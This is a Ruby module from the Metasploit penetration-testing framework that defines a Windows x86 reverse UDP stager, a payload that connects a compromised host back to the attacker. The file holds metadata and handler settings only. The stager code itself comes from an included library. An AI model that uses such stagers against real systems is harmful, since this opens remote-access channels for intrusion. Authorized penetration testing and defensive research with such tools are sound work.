##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core/handler/reverse_udp'
require 'msf/core/payload/windows/reverse_udp'

module MetasploitModule

  CachedSize = 324

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseUdp

  def self.handler_type_alias
    'reverse_udp'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse UDP Stager with UUID Support',
      'Description' => 'Connect back to the attacker with UUID Support',
      'Author'      => 'RageLtMan <rageltman[at]sempervictus>',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseUdp,
      'Convention'  => 'udpsockedi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

  #
  # Override the uuid function and opt-in for sending the
  # UUID in the stage.
  #
  def include_send_uuid
    false
  end

end
